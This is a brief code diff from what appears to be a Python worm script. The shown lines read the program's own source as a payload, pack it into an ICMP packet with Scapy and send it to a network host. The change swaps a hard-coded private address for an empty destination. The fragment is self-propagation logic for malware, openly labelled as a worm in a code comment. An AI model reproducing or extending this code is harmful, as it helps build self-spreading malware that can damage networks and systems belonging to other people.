@@ -93,7 +93,7 @@ if __name__ == "__main__":
         
         # Create an ICMP packet with custom payload
         payload = open(sys.argv[0], 'r').read()  # Read the worm program as payload
-        packet = IP(dst="192.168.0.1") / ICMP() / payload
+        packet = IP(dst="") / ICMP() / payload
         
         # Send the packet
         send(packet)
